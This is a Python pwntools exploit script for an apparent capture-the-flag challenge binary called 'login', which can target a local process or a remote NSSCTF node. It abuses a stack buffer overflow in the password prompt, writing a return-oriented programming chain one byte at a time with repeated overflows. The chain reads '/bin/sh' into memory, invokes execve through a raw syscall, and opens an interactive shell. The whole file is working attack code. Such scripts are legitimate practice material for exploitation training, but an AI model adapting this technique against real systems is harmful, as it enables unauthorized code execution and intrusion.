from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
elf = ELF('./login')

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./login')
else:
    io = remote('node5.anna.nssctf.cn',28110)

def p():
    gdb.attach(proc.pidof(io)[0])

'''
read(0, binsh_addr_addr, 0x30)

pop rdi
0 
pop rsi 
bin_addr
pop rdx
0x30 
read_addr

execve(binsh_addr, 0, 0)
pop rdi
bin_addr
pop rsi
0 
pop rdx
0 
pop rax
0x3b
syscall

'''

pop_rdi = 0x400706 # pop rdi ; ret
pop_rsi = 0x410043 # pop rsi ; ret
pop_rdx = 0x448c95 # pop rdx ; ret
pop_rax = 0x4005af # pop rax ; ret
syscall = 0x4012bc # syscall
read_addr = 0x448C80
bin_addr = 0x6bbf08
sh_addr = 0x4A49C0 + 0xc
pop_rdx_rsi = 0x000000000044b249 # pop rdx ; pop rsi ; ret

ROP =[pop_rdi, 0, pop_rsi, bin_addr, pop_rdx, 0x30, read_addr,\
      pop_rdi, bin_addr, pop_rsi, 0, pop_rdx, 0,  pop_rax, 0x3b, syscall]

#ROP =[pop_rdi, sh_addr, pop_rsi, 0, pop_rdx, 0,  pop_rax, 0x3b, syscall]


for i in range(16):
    idx = 15 - i
    if idx == 1 or idx == 5 or idx == 10 or idx == 12 or idx == 14:
        for j in range(7):
            success("ROP[idx] = " + hex(ROP[idx]) + " count = " + str(j))
            passwd = b'a'* (0x108 + 8 * (idx + 1) - 1 - j) + b'\x00'
            passwd = passwd.ljust(0x200,b'\x00')
            io.sendafter(b"Input your password:",passwd)
    else:
        for k in range(4):
            passwd = b'a'* (0x108 + 8 * (idx + 1) - 1 - k ) + b'\x00'
            passwd = passwd.ljust(0x200,b'\x00')
            io.sendafter(b"Input your password:",passwd)
    if idx == 2 or idx == 9:
        passwd = b'a' * (0x108 + 8 * idx) + b'\x43\xaa\x41'
        passwd = passwd.ljust(0x200,b'\x00')
        io.sendafter(b"Input your password:",passwd)
        passwd = b'a' * (0x108 + 8 * idx) + b'\x43\x00'
        passwd = passwd.ljust(0x200,b'\x00')
        io.sendafter(b"Input your password:",passwd)
    else:
        passwd = b'a' * (0x108 + 8 * idx) + p64(ROP[idx])
        passwd = passwd.ljust(0x200,b'\x00')
        io.sendafter(b"Input your password:",passwd)
#p()


passwd = b"PASSWORD\x00"
io.sendafter(b"Input your password:",passwd)

pause()
io.send(b'/bin/sh\x00')

io.interactive()

